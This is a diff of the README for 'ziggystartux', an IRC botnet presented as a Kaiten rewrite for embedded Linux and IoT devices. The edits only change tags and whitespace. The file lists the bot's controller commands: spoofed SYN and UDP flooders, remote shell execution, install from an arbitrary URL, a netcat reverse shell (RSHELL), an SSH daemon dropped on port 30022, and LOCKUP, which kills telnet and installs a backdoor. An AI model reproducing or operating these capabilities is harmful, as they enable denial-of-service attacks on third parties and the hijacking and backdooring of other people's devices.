@@ -1,6 +1,6 @@
 # ziggystartux
 A Kaiten rewrite, with much new functionality, and many fixes for the old stuff! Tailored toward embedded Linux devices, because... well, the internet of things of the new frontier!
-<code>
+<pre>
 
    oooooo  o                      .oPYo.  o             ooooo                 
       d'                         8       8               8                    
@@ -44,9 +44,9 @@ A Kaiten rewrite, with much new functionality, and many fixes for the old stuff!
         PAN <target> <port> <secs>    = A SYN flooder                         
         UDP <target> <port> <secs>    = An UDP flooder                        
         UNKNOWN <target> <secs>       = Another non-spoof udp flooder         
-        NICK <nick>                   = Changes the nick of the client        
-        SERVER <server>               = Changes servers                       
-        GETSPOOFS                     = Gets the current spoofing             
+        NICK <nick>                   = Changes the nick of the client  
+        SERVER <server>               = Changes servers              
+        GETSPOOFS                     = Gets the current spoofing    
         SPOOFS <subnet>               = Changes spoofing to a subnet          
         DISABLE                       = Disables all packeting from this bot  
         ENABLE                        = Enables all packeting from this bot   
@@ -57,18 +57,18 @@ A Kaiten rewrite, with much new functionality, and many fixes for the old stuff!
         HELP                          = Displays this                         
         IRC <command>                 = Sends this command to the server      
         SH <command>                  = Executes a command                    
-        ISH <command>                 = "Interactive" SH, send to channel     
-        BASH <command>                = Run a bash command                    
+        ISH <command>                 = "Interactive" SH, send to channel
+        BASH <command>                = Run a bash command
         SHD <command>                 = Daemonize command                     
-        UPDATE <http://server/bot>    = Update this bot                       
-        HACKPKG <http://server/bin>   = Install binary (no dependencies)      
+        UPDATE <http://server/bot>    = Update this bot 
+        HACKPKG <http://server/bin>   = Install binary (no wget dependency)
         INSTALL <http://server/bin>   = Install binary (via wget)             
-        BINUPDATE <http://server/bin> = Update a binary (via wget)            
+        BINUPDATE <http://server/bin> = Update a binary (via wget)      
         SCAN <nmap opts>              = Call an nmap wrapper script           
-        GETSSH <http:serverdropbear>  = Install dropbear, run on port 30022   
-        RSHELL <ip port>              = Equates to nohup nc ip port           
-        GETBB <tftp server>           = Get a proper busybox (via tftp)       
-        LOCKUP <http://server/bin>    = Kill telnet, install a backdoor!      
+        GETSSH <http:serverdropbear>  = Install dropbear, run on port 30022
+        RSHELL <ip port>              = Equates to nohup nc ip port     
+        GETBB <tftp server>           = Get a proper busybox (via tftp) 
+        LOCKUP <http://server/bin>    = Kill telnet, install a backdoor!
                                                                               
   Remember, all these commands must be prefixed by a ! and the nickname that  
   you want the command to be sent to (can include wildcards). There are no    
@@ -76,5 +76,5 @@ A Kaiten rewrite, with much new functionality, and many fixes for the old stuff!
   the !                                                                       
                                                                               
                                 - contem on efnet                             
-</code>
+</pre>
 
